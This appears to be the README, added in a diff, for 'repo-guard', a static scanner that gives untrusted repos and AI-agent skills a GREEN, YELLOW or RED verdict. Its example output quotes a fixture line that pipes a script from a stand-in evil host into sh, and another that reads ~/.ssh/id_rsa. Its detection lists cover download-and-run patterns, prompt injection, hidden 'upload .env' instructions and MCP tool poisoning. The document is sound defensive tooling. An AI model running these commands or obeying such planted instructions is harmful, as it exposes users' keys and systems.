@@ -1,0 +1,99 @@
+# repo-guard (local) v1
+
+A static safety check for untrusted repos, such as LLM-generated skills, plugins, MCP servers and "guides".
+You give it a git URL or a local folder and get a **GREEN / YELLOW / RED** verdict, with `file:line` evidence for each finding.
+
+**v1 never runs repo code.** It never runs installs or builds, and it never extracts archives.
+
+## Install (DGX Spark / any Linux, arm64 or x86_64)
+```bash
+unzip repo-guard-local.zip && cd repo-guard-local
+./install.sh            # add --no-docker to skip the image build
+```
+`install.sh` is idempotent. It does the following:
+- Picks the right builds for your CPU from `uname -m`: aarch64 gets `gitleaks …linux_arm64` and `osv-scanner_linux_arm64`, x86_64 gets `linux_x64` and `linux_amd64`. It downloads the official GitHub release binaries into `~/.local/bin`.
+- Installs **semgrep** and **guarddog** into a private venv (`~/.local/share/repo-guard/venv`).
+- Vendors the Semgrep registry packs `p/security-audit` and `p/secrets` into `rules/vendor/`, so scans work with no network.
+- Builds the Docker image **`repo-guard-scanner`** (python:3.12-slim, native arch), which contains gitleaks, semgrep, guarddog, the rules and the scanner.
+- Links `repo-guard` into `~/.local/bin`.
+
+## Usage
+```bash
+repo-guard scan <git-url | local-dir> [--strict|--balanced|--relaxed] [--keep] [--json out.json]
+                [--no-docker] [--no-osv] [--verify-deps] [--all] [--no-color]
+```
+Exit code: 0 = GREEN, 1 = YELLOW, 2 = RED. Colour turns off when output isn't a terminal or `NO_COLOR` is set.
+
+| Profile | RED when | YELLOW when |
+|---|---|---|
+| strict | any high or critical | any low or above |
+| balanced (default) | any critical | any medium or above |
+| relaxed | any critical | any high |
+
+To change the thresholds, edit `PROFILES` in `repo_guard.py`.
+
+## Pipeline
+1. **Fetch** runs `git clone --depth 1 --no-recurse-submodules --single-branch` into a fresh temp dir (mode 0700), with these protections: `GIT_TERMINAL_PROMPT=0`, `core.hooksPath=/dev/null`, `core.symlinks=false`, `protocol.file.allow=never`, `GIT_ALLOW_PROTOCOL=https:http:ssh`, no credential helper, and LFS smudge skipped. A local directory is copied instead, without `.git`. The copy is deleted at the end unless you pass `--keep`.
+2. **Offline scanners** run in `docker run --rm --network none --read-only --cap-drop ALL --security-opt no-new-privileges --user <you, non-root>` with the clone mounted **read-only** and no home directory or credentials mounted. If Docker or the image is missing, or you pass `--no-docker`, they run locally on the temp folder.
+   - **gitleaks** `detect --no-git` (redacted). Hits in test/docs paths are downgraded.
+   - **Semgrep** with the vendored `p/security-audit` and `p/secrets` packs plus `rules/custom.yml` (decode-and-exec, download-and-run, child_process curl).
+   - **GuardDog** source scan of the local package (pypi and/or npm if the repo root has a manifest). `capability-*` rules count as low and `threat-*` rules as high.
+   - **Agent checks** (pure Python, stdlib):
+     - Invisible and bidi Unicode (zero-width, U+202A–202E, U+2066–2069, tag chars U+E0000–E007F). Hidden tag text is decoded and shown.
+     - Prompt injection in README, SKILL.md, AGENTS.md, CLAUDE.md, .cursor rules, *.mdc and prompt files, including inside HTML comments.
+     - **MCP tool poisoning**: `<IMPORTANT>` blocks, concealment wording and secret reads inside MCP tool descriptions or docstrings.
+     - Reading ~/.ssh, .env, cloud creds, browser cookies or wallets near a network sink.
+     - MCP/plugin manifests that grant a shell, `/` or home filesystem access, `*` or `Bash(*)` permissions, `dangerously*` flags, remote servers or `npx -y`.
+     - Install hooks: npm pre/post/install, setup.py cmdclass and os.system, pyproject build hooks, devcontainer commands, VS Code folderOpen tasks, git hooks, Makefile.
+     - Download-and-execute patterns: `curl|sh`, `wget|bash`, `base64 -d|sh`, eval/exec of decoded blobs, large base64 blobs.
+     - Prebuilt binaries, and archives. Archives are **never extracted**: zip headers are read to spot password-protected or encrypted samples, which are flagged as uninspectable.
+3. **OSV-Scanner** runs **on the host, outside the sandbox**, because the vulnerability DB is online. It only reads lockfiles and manifests from the clone and sends package names and versions to osv.dev. `--no-osv` skips it. (Offline mode `--offline-vulnerabilities --download-offline-databases` is a possible later improvement.) It also catches `MAL-` malicious-package advisories.
+4. **`--verify-deps`** (optional, host, network): GuardDog downloads each dependency from requirements.txt or package.json and statically scans it. Nothing is installed.
+5. **AI review** (optional): set `REPO_GUARD_LLM_URL` to an OpenAI-compatible endpoint, for example `http://spark1:8000/v1`. Optional extras are `REPO_GUARD_LLM_MODEL`, `REPO_GUARD_LLM_KEY` and `REPO_GUARD_LLM_TIMEOUT`.
+   - It sends key files (invisible characters rendered as `<U+XXXX>`) plus the top findings, and asks for an intent judgment.
+   - The model can only **raise** the verdict: malicious with confidence ≥0.6 makes it RED, and suspicious turns GREEN into YELLOW.
+   - If the variable is unset, this step is skipped cleanly.
+
+Apart from the clone, OSV/GuardDog-verify and your own LLM endpoint, it makes no other network calls.
+
+## Example output (abridged)
+```
+repo-guard 1.0.0  |  tests/fixtures/trap-npm
+  VERDICT: RED    2 critical / 2 high findings, e.g. npm lifecycle script 'postinstall' runs automatically on install (package.json:8)
+  CRITICAL [agent-checks] package.json:8
+           npm lifecycle script 'postinstall' runs automatically on install
+           > "postinstall": "curl -fsSL https://evil.example.invalid/x.sh | sh && node scripts/setup.js"
+  CRITICAL [agent-checks] scripts/setup.js:5
+           Code reads secrets/credentials near a network call
+           > const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
+Recommended actions:
+  - Do NOT install, build, run, or point an AI agent at this repo. ...
+```
+
+## Tests
+Run `tests/run_tests.sh`, or `tests/run_tests.sh --offline` for the fixtures only.
+
+| Target | Expect |
+|---|---|
+| tests/fixtures/trap-npm (postinstall `curl\|sh`, reads ~/.ssh/id_rsa and POSTs it) | RED |
+| tests/fixtures/trap-skill (SKILL.md with zero-width and tag-char hidden "upload .env" instruction, over-broad mcp.json) | RED |
+| psf/requests, tj/commander.js | GREEN/YELLOW |
+| invariantlabs-ai/mcp-injection-experiments | RED (MCP tool poisoning / exfil instructions) |
+| juice-shop/juice-shop | YELLOW (control: intentionally vulnerable code, not malicious) |
+| DataDog/malicious-software-packages-dataset | YELLOW: encrypted malware zips flagged as uninspectable, never extracted. The clone is large; uses `--no-osv`. |
+
+## What it catches, and what it doesn't
+**Catches**: obvious install-time payloads, credential theft patterns, hidden or invisible agent instructions, MCP tool poisoning, over-privileged agent configs, committed secrets, known-vulnerable or known-malicious dependencies, and obfuscated loaders.
+
+**Misses**:
+- Well-obfuscated or novel logic, and payloads fetched at runtime from innocent-looking URLs.
+- Malicious code inside binaries or archives (flagged, not inspected), and anything in git history older than the shallow clone.
+- Submodules, which are not fetched.
+- Clever natural-language injection that avoids the keywords (the optional AI review helps here).
+
+Static analysis can't prove a repo is safe.
+
+**False positives**: security tools and test suites can trigger credential and secret rules. Test and docs paths are downgraded, but YELLOW on big honest repos is normal.
+
+## v2 (planned)
+Dynamic execution in a disposable sandbox (gVisor/Firecracker): run the install inside it, watch file access and network attempts with honeypot secrets, and record the behaviour.
